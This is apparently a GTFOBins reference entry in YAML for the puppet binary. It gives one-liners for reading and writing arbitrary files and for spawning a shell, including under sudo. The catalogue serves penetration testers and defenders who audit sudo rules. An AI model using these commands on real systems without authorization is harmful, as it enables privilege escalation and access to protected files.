<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/puppet -->
---
functions:
  file-read:
  - code: |-
      puppet filebucket -l diff /dev/null /path/to/input-file
    comment: |-
      The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.
    contexts:
      sudo:
      unprivileged:
  file-write:
  - code: |-
      puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
    contexts:
      sudo:
      unprivileged:
...
